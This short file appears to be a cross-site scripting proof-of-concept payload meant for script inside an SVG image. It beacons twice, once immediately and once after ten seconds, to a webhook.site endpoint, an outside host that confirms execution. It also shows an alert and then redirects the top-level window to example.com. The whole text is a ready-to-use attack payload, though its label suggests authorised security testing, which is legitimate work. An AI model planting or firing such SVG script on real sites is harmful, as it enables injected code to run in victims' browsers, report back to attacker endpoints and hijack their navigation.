svg.script:
// Immediate webhook request and alert
fetch('https://webhook.site/2c371927-56cd-4a84-9ba8-c44ef80039f3', {method: 'GET', mode: 'no-cors'}).catch(e => console.log('Immediate webhook request failed:', e));
alert('XSS PoC: Safe demonstration');
// Delayed webhook request and redirect
setTimeout(() => {
    fetch('https://webhook.site/2c371927-56cd-4a84-9ba8-c44ef80039f3', {method: 'GET', mode: 'no-cors'}).catch(e => console.log('Delayed webhook request failed:', e));
    window.top.location.href = 'http://example.com';
}, 10000);
